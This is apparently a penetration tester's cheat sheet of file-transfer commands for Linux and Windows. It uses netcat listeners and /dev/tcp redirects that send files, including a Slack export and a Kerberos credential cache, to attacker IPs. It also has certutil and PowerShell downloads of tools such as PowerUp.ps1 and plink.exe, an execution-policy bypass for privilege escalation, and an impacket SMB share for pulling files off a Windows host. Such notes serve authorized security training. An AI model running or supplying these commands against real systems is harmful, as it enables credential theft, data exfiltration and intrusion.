nc -lnvp 80 < FILENAME

bash -c “cat < /dev/tcp/$IP/$PORT > FILENAME”

cat 'Test Workspace Slack export May 17 2020 - May 18 2020.zip' > /dev/tcp/172.16.1.100/50001

nc -lnvp 50001 > krb5cc

cat 'krb5cc_50' > /dev/tcp/10.10.16.51/50001

# Windows #

iwr -uri [http://192.168.](http://192.168.119.3/adduser.exe)45.236/PowerUp.ps1 -Outfile PowerUp.ps1

powershell -ep bypass

. .\PowerUp.ps1

Get-ModifiableServiceFile

certutil.exe -urlcache -split -f “http://172.16.5.15:8000/agent.exe”

powershell wget -uri [http://192.168.45.157/plink.exe](http://192.168.45.157/plink.exe) -OutFile C:\Windows\Temp\plink.exe

Transfer from Windows to Kali

### spin up SMB server on Kali

impacket-smbserver share . -smb2support -username temp -password temp

### Copy file from Windows to Kali

net use \\172.16.1.100\share /user:temp temp

copy tasks.txt \\172.16.1.100\share